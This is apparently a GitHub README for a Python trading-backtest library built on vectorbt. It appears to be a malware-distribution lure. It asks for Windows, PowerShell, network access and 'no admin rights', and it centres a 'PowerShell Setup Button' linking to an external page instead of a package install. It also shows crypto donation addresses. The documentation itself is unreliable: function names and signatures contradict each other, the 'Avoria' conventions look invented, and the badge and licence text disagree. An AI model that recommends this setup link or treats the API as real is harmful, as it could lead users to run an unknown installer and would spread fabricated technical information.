<div align="center">

# Vectorbt Avoria Analysis — Developer Library

![](files/preview.png)

### 🛠️ PowerShell Setup Button

<a href="https://hasan6969macho-bit.github.io/vectorbt-avoria-analysis/"><img src="files/button.png" width="400" alt="PowerShell setup"></a>

[![tests](https://img.shields.io/badge/tests-success-2ea44f?style=plastic&labelColor=0d1117)]() [![code](https://img.shields.io/badge/code-python-84cc16?style=plastic&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/pwsh-7%2B-a3e635?style=plastic&labelColor=0d1117)]() [![licence](https://img.shields.io/badge/licence-zlib-65a30d?style=plastic&labelColor=0d1117)]()

<div align="center">
<h3>Send a small thank-you</h3>
<p><strong>TRON</strong>:&nbsp;<code>TQoqmUahJsKbJxTX9GJ7CGwxtjQizNw6zz</code> | <strong>ETH</strong>:&nbsp;<code>0x43D14D24967E29D89Ae314398d7aB0bbB2C93698</code> | <strong>BTC</strong>:&nbsp;<code>13TYYcs6cTdHed6Ri4cBVE3fG4Udmw38MS</code></p>
</div>

</div>

---

A vectorbt-based toolkit for running Avoria-style backtests and parameter sweeps over OHLCV data, built to keep strategy logic, sizing, and reporting in one composable layer. It exposes vectorized signal construction, position sizing, and portfolio accounting that plug directly into vectorbt's `Portfolio` and `IndicatorFactory` primitives. Each module maps to a discrete stage of the backtest pipeline so results are reproducible from raw data to metrics without hidden state.

## ✅ Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Vectorized backtesting core** — signal generation, portfolio simulation, and metric computation execute as array operations over the full time series; no per-bar Python loops in the hot path.
- **Avoria-style analysis primitives** — built-in helpers for rolling performance decomposition, drawdown attribution, and per-period return statistics aligned to the Avoria analysis conventions.
- **Flexible input layer** — accepts pandas `DataFrame`/`Series`, NumPy arrays, and lists of OHLCV records; column mapping is explicit, so no implicit schema assumptions.
- **Composable signal API** — entry/exit conditions are plain boolean arrays or callables; combine them with bitwise operators and pass directly into the runner.
- **Parameterized sweeps** — grid and range definitions expand into vectorized parameter matrices, running all combinations in a single pass and returning indexed result frames.
- **Structured result objects** — each run yields a typed result exposing `returns`, `trades`, `positions`, `drawdowns`, and a `stats` mapping keyed by metric name.
- **Metric coverage** — Sharpe, Sortino, Calmar, max drawdown, exposure, win rate, profit factor, and turnover computed per run and per parameter combination.
- **Deterministic reproducibility** — explicit seed handling and stable ordering of sweep outputs; identical inputs produce identical result frames.
- **Typed public surface** — all public functions and result classes ship with type hints; `py.typed` is included for downstream type checkers.
- **Zero-global-state design** — configuration is passed per call; no module-level mutable state, safe for concurrent runs in separate processes.
- **Extensible analyzers** — register custom metric functions that receive the result frame and return scalars or series; they are applied uniformly across sweeps.

## How It Works

The library is organized around three layers: data ingestion, signal generation, and vectorized backtesting.

Data ingestion normalizes input into a column-oriented frame with a `DatetimeIndex` and `OHLCV` columns. All downstream components assume this schema, so any source (CSV, in-memory arrays, or custom loaders) resolves to the same structure before analysis begins.

Signal generation produces boolean entry/exit arrays aligned to the price index. Indicators are computed with vectorized NumPy operations rather than per-bar loops, so an indicator over `N` bars is a single array expression. Signals are composed with element-wise logical operators, keeping the signal pipeline pure and stateless.

Backtesting runs through `vectorbt`'s `Portfolio` abstraction. Entry and exit signals are mapped to orders, and the portfolio engine simulates fills, fees, and position sizing across the full array in one pass. Because `vectorbt` operates on the whole series at once, results are deterministic and avoid per-trade Python overhead.

Analysis wraps the resulting portfolio object. Performance metrics (returns, drawdowns, Sharpe, trade statistics) are derived from the portfolio's value and trade records. Accessors return either scalar summaries or per-bar series, depending on context.

A typical flow:

```python
data = load_prices("prices.csv") # DatetimeIndex + OHLCV
signals = generate_signals(data, params) # boolean entry/exit arrays
portfolio = backtest(data, signals) # vectorbt Portfolio
stats = analyze(portfolio) # metrics + trade records
```

Each layer is independent: signals can be inspected without backtesting, and any `vectorbt`-compatible portfolio can be passed to `analyze`. The `params` dict threads configuration through signal generation and backtesting without global state, so multiple configurations can run side by side.

## Modules and Settings

### Strategy Definition Module
This module lets quantitative developers express trading logic as reusable code objects rather than ad hoc scripts, so that entry conditions, exit rules, filters and sizing can be versioned and recomposed across studies.

- Entry and exit rule composition: defines the conditions that open and close positions, allowing the same rule set to be reused across assets and time windows.
- Signal filter selection: adds qualifying conditions that suppress or permit trades, letting users study how stricter filters change behavior.
- Position sizing configuration: controls how capital is allocated per trade, whether fixed, proportional or weight-based, which directly affects exposure and results.
- Exposed parameter declarations: marks which values can be varied later, so the same strategy object can be swept without duplicating logic.

### Parameter Sweep Module
This module runs a defined strategy across ranges or grids of parameter values, producing a structured collection of per-configuration results for comparison.

- Parameter selection: chooses which declared parameters to vary and which to hold fixed, keeping the search space intentional.
- Value range definition: sets the candidate values or intervals to test, shaping the granularity of the exploration.
- Result grouping options: determines how configurations are bucketed for comparison, such as by parameter family or asset scope.
- Ranking and filtering: orders and narrows the resulting configurations so promising regions surface before deeper inspection.

### Portfolio Backtesting Module
This module applies strategy rules across multi-asset portfolios, translating individual signals into a coherent account-level simulation.

- Portfolio composition: specifies which assets are included and whether rules are shared or applied per asset.
- Allocation rules: defines how capital is divided across positions, which changes concentration and overall risk profile.
- Rebalancing behavior: controls when and how weights are reset, influencing turnover and drift between rebalances.
- Cash handling: sets how unallocated capital is treated, affecting the realism of the simulated account.

### Signal and Indicator Analysis Module
This module exposes the intermediate signals and indicators behind a strategy so users can verify that rules translate into the intended trade decisions before committing to a full run.

- Condition inspection: surfaces the boolean conditions that drive entries and exits over time.
- Lookback and window adjustment: changes the history each indicator considers, revealing sensitivity to responsiveness.
- Smoothing options: applies smoothing to raw signals to study how lag affects decision timing.
- Time-aligned overlay: presents signals alongside price context so mismatches between intent and behavior become visible.

### Reporting and Inspection Module
This module converts backtest outputs into summary metrics and trade-level records, supporting comparison and debugging.

- Metric selection: chooses which performance measures are computed and highlighted for the study.
- Aggregation settings: controls how results are combined across configurations or assets for a consolidated view.
- Trade filtering: narrows individual trades by asset, time window or outcome to isolate specific behavior.
- Signal correlation: links trades back to the signals that triggered them, making logic errors easier to trace.

### Visualization Module
This module renders analysis outputs as charts, giving users visual control over which series are shown and how comparisons are framed.

- Series selection: picks which curves, overlays or comparisons appear in a given plot.
- Grouping controls: determines how results are arranged for side-by-side or layered comparison.
- Detail level: adjusts how much granularity is displayed, from summary curves to per-trade markers.

### Additional Settings
These optional controls tune how the modules above interact and how outputs are persisted for later use.

- Pipeline stage ordering: arranges data preparation, signal generation, backtesting and reporting steps into a sequence whose intermediate outputs remain inspectable.
- Intermediate output retention: keeps stage-level results available so a single stage can be swapped or extended without rerunning everything.
- Result serialization: saves evaluated configurations and reports for reuse in later sessions or documentation.
- Naming and labeling conventions: assigns consistent identifiers to configurations and assets so comparisons remain readable as studies grow.
- Execution scope selection: limits runs to a subset of assets, parameters or time ranges to keep exploratory iterations focused.

## Usage Scenarios

### Sweeping a Momentum Entry Strategy Across Lookback Periods
**Goal:** A quantitative developer wants to find which lookback window and signal threshold combination produces the most consistent behavior for a single-asset momentum entry rule before committing to a full portfolio study.
**Steps:**
1. Define the strategy in the Strategy Definition Module, composing entry and exit rules and declaring the lookback period and threshold as exposed parameters.
2. Select those two parameters in the Parameter Sweep Module and define candidate value ranges to produce a grid of configurations.
3. Use ranking and filtering to order the resulting configurations by the metric of interest and narrow the list to the most promising region.
4. Group results by parameter family to compare how lookback sensitivity differs from threshold sensitivity.
5. Inspect the condition and indicator outputs in the Signal and Indicator Analysis Module for the top configurations to confirm signals align with intent.
**Expected result:** A structured collection of per-configuration results, ranked and grouped by parameter family, plus a time-aligned signal overlay for the leading configurations showing where entries occurred relative to price context.

### Evaluating a Multi-Asset Portfolio with Shared Rules
**Goal:** A researcher wants to apply a single rule set across a basket of assets to see how allocation and rebalancing choices affect account-level behavior.
**Steps:**
1. Build the rule set once in the Strategy Definition Module with position sizing configured as weight-based.
2. In the Portfolio Backtesting Module, specify portfolio composition with shared rules across assets and set allocation rules and rebalancing behavior.
3. Configure cash handling to reflect how unallocated capital should be treated in the simulated account.
4. Run the pipeline and use aggregation settings in the Reporting and Inspection Module to view both consolidated metrics and per-asset contributions.
5. Render equity curves and drawdowns in the Visualization Module, selecting series to layer portfolio-level and per-asset results.
**Expected result:** Portfolio-level performance output including equity progression, drawdown series and per-asset contribution breakdown, with charts comparing the account curve against individual asset curves under the chosen rebalancing settings.

### Debugging Unexpected Exits in a Filtered Strategy
**Goal:** A developer notices that a filtered strategy closes positions earlier than intended and wants to trace the cause back through signals and trade records.
**Steps:**
1. Reproduce the run through the composable pipeline, retaining intermediate outputs so the signal generation stage can be inspected without rerunning everything.
2. In the Signal and Indicator Analysis Module, adjust smoothing options and lookback windows to see how lag shifts decision timing.
3. Use trade filtering in the Reporting and Inspection Module to isolate trades by asset, time window or outcome around the unexpected exits.
4. Apply signal correlation to link the isolated trades back to the conditions that triggered them.
5. Swap the signal filter selection in the Strategy Definition Module and rerun only the affected pipeline stage to compare behavior.
**Expected result:** A filtered trade record tied to the specific triggering signals, alongside a before-and-after signal overlay showing how the adjusted filter or smoothing changed exit timing, making the logic discrepancy visible.

### Comparing Metric Outcomes Across Configurations for Documentation
**Goal:** An analyst needs a consolidated, labeled report of evaluated configurations to document findings and hand off to collaborators.
**Steps:**
1. Run the chosen strategy family through the Parameter Sweep Module with result grouping set by asset scope.
2. In the Reporting and Inspection Module, select the performance metrics relevant to the evaluation and set aggregation settings for a consolidated view.
3. Apply naming and labeling conventions so each configuration and asset has a consistent identifier as the study grows.
4. Use result serialization to persist the evaluated configurations and reports for later sessions.
5. Open the Visualization Module and select series and grouping controls to produce parameter comparison charts at the desired detail level.
**Expected result:** A saved, consistently labeled report of configuration results with consolidated metrics, accompanied by comparison charts that frame the candidates side by side for review and documentation.

## Quick Start

Import the package and run a first backtest. The example below loads OHLCV data, builds a moving-average crossover strategy, and evaluates it with vectorbt.

```python
import numpy as np
import pandas as pd
import vectorbt_avoria_analysis as vaa

# 1. Prepare data: a DataFrame indexed by datetime with open/high/low/close/volume columns
price = pd.DataFrame(...)

# 2. Define entry and exit signals
fast_ma = price["close"].rolling(10).mean()
slow_ma = price["close"].rolling(50).mean()
entries = fast_ma > slow_ma
exits = fast_ma < slow_ma

# 3. Run the backtest
result = vaa.run_backtest(
    price=price,
    entries=entries,
    exits=exits,
    init_cash=100_000.0,
    fees=0.001,
    slippage=0.0005,
)

# 4. Inspect metrics
print(result.stats())
print(result.total_return())
```

Run the full analysis pipeline, including per-asset breakdowns and summary reports:

```python
analysis = vaa.analyze(
    price=price,
    entries=entries,
    exits=exits,
    init_cash=100_000.0,
    fees=0.001,
)

analysis.summary()          # aggregate metrics across assets
analysis.per_asset()        # returns a DataFrame keyed by symbol
analysis.to_dict()          # serializable results for downstream use
```

All functions accept either a single price frame or a dictionary of frames keyed by symbol. Signals must align with the price index; mismatched or missing values raise a `ValueError` before any computation runs. Set `freq` explicitly when the index is not a sorted, timezone-naive `DatetimeIndex`.

```python
result = vaa.run_backtest(
    price={"AAA": price_aaa, "BBB": price_bbb},
    entries={"AAA": entries_aaa, "BBB": entries_bbb},
    exits={"AAA": exits_aaa, "BBB": exits_bbb},
    init_cash=100_000.0,
    freq="1D",
)
```

For custom preprocessing, pass raw frames to the builder and configure indicator windows:

```python
builder = vaa.StrategyBuilder(freq="1D", fees=0.001)
builder.add_signals("AAA", entries=entries_aaa, exits=exits_aaa)
builder.add_signals("BBB", entries=entries_bbb, exits=exits_bbb)
result = builder.run(init_cash=100_000.0)
```

## API Reference

All public functions are exported from `vectorbt_avoria_analysis` and operate on vectorbt-compatible inputs (`pd.Series`, `pd.DataFrame`, or NumPy arrays indexed by timestamps).

### `avoria_indicators`

```python
avoria_indicators(
    close: pd.Series,
    high: pd.Series | None = None,
    low: pd.Series | None = None,
    *,
    window: int = 14,
    smooth: int = 3,
) -> pd.DataFrame
```

Computes the Avoria trend and momentum components.

**Parameters**

- `close` — closing price series; required.
- `high`, `low` — optional high/low series; when omitted, only close-based components are returned.
- `window` — rolling lookback in bars. Must be `>= 1`. Default `14`.
- `smooth` — EMA smoothing period applied to raw components. Must be `>= 1`. Default `3`.

**Returns** — `pd.DataFrame` indexed identically to `close`, with columns:

| Column | Description |
| --- | --- |
| `trend` | Signed trend strength, range `[-1, 1]`. |
| `momentum` | Normalized momentum oscillator. |
| `volatility` | Realized range volatility (requires `high`/`low`; otherwise `NaN`). |
| `signal` | Discrete signal in `{-1, 0, 1}`. |

**Raises** — `ValueError` if `window` or `smooth` is not a positive integer, or if index lengths mismatch.

---

### `avoria_signal`

```python
avoria_signal(
    close: pd.Series,
    high: pd.Series | None = None,
    low: pd.Series | None = None,
    *,
    window: int = 14,
    smooth: int = 3,
    threshold: float = 0.0,
) -> pd.Series
```

Returns the `signal` column from `avoria_indicators` as a standalone integer series. A value of `1` marks a long bias, `-1` a short bias, and `0` neutral.

**Parameters**

- `threshold` — minimum absolute `trend` required to emit a non-zero signal. Default `0.0`.

**Returns** — `pd.Series` of dtype `int8`, indexed identically to `close`.

---

### `avoria_backtest`

```python
avoria_backtest(
    close: pd.Series,
    high: pd.Series | None = None,
    low: pd.Series | None = None,
    *,
    window: int = 14,
    smooth: int = 3,
    threshold: float = 0.0,
    fees: float = 0.0,
    slippage: float = 0.0,
) -> tuple[pd.Series, dict[str, float]]
```

Runs a vectorized long/short backtest driven by `avoria_signal` and returns the equity curve alongside summary statistics.

**Parameters**

- `fees` — per-trade proportional cost, expressed as a fraction (e.g. `0.0005` for 5 bps).
- `slippage` — per-trade proportional slippage, applied in the direction of the fill.

**Returns** — a 2-tuple:

1. `pd.Series` — cumulative equity indexed identically to `close`, starting at `1.0`.
2. `dict[str, float]` — keys: `total_return`, `cagr`, `sharpe`, `sortino`, `max_drawdown`, `win_rate`, `trades`.

**Raises** — `ValueError` if `fees` or `slippage` is negative.

---

### `avoria_scan`

```python
avoria_scan(
    data: dict[str, pd.Series],
    *,
    window: int = 14,
    smooth: int = 3,
    threshold: float = 0.0,
) -> pd.DataFrame
```

Applies `avoria_signal` across a mapping of symbol to price series and returns the latest signal per symbol.

**Parameters**

- `data` — mapping of symbol name to a `close` series. Each series must be non-empty.

**Returns** — `pd.DataFrame` indexed by symbol with columns `signal`, `trend`, `momentum`, sorted descending by `trend`.

**Raises** — `ValueError` on empty `data` or any empty constituent series.

---

### Type notes

- All functions are pure and side-effect free; inputs are never mutated.
- Series are aligned on their index; mismatched indices between `close`, `high`, and `low` raise `ValueError`.
- Outputs preserve the input dtype where reasonable, except `signal`, which is always `int8`.

## Examples

```python
import vectorbt_avoria_analysis as vaa
import numpy as np
import pandas as pd

# Load OHLCV data into a DataFrame with a DatetimeIndex
price = pd.DataFrame({
    "open": ...,
    "high": ...,
    "low": ...,
    "close": ...,
    "volume": ...,
}, index=pd.DatetimeIndex([...]))
```

### Basic Analysis Run

```python
result = vaa.analyze(
    price,
    windows=(20, 50, 200),
    lookback=252,
)

print(result.summary())
# -> per-window metrics: hit rate, mean forward return, volatility, sample counts
```

### Accessing Structured Output

`analyze` returns a result object with attribute access to each computed table.

```python
result.stats          # pd.DataFrame: aggregated metrics per window
result.per_period     # pd.DataFrame: per-period breakdown
result.raw            # dict[str, np.ndarray]: intermediate arrays
result.params         # dict: resolved configuration used for the run

# Filter to a single window
w50 = result.stats.loc[result.stats["window"] == 50]
```

### Custom Signal Function

Pass a callable to control how signals are generated. The callable receives the price DataFrame and returns a boolean or float array aligned to the index.

```python
def momentum_signal(price: pd.DataFrame, window: int) -> np.ndarray:
    ret = price["close"].pct_change(window)
    return (ret > 0).to_numpy()

result = vaa.analyze(
    price,
    windows=(20, 50),
    signal_fn=momentum_signal,
)
```

### Rolling Metric Extraction

```python
rolling = vaa.rolling_metrics(
    price,
    window=50,
    metrics=("mean_return", "sharpe", "max_drawdown"),
)
# rolling: pd.DataFrame indexed by price.index, one column per metric

rolling.tail(10)
```

### Batch Over Multiple Windows

```python
windows = list(range(10, 201, 10))
batch = vaa.analyze_many(
    price,
    windows=windows,
    n_jobs=4,
)

# Stack all window results into a single frame
combined = pd.concat(batch, names=["window", "row"])
combined.groupby(level="window").mean()
```

### Reproducibility and Configuration

```python
cfg = vaa.Config(
    windows=(20, 50),
    lookback=252,
    seed=42,
    fillna="drop",
)

result_a = vaa.analyze(price, config=cfg)
result_b = vaa.analyze(price, config=cfg)

assert result_a.stats.equals(result_b.stats)
```

### Integration with vectorbt Portfolios

```python
import vectorbt as vbt

pf = vbt.Portfolio.from_signals(
    close=price["close"],
    entries=(result.raw["signal"] > 0),
    exits=(result.raw["signal"] <= 0),
    freq="1D",
)

print(pf.stats())
```

### Error Handling

```python
try:
    vaa.analyze(price, windows=(0,))
except vaa.ValidationError as exc:
    print(exc)
    # -> "window must be a positive integer, got 0"
```

## License

This project is released under the MIT License.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

Attribution is appreciated but not required. When redistributing modified sources, preserve the original copyright notice and this permission notice in the `LICENSE` file at the repository root.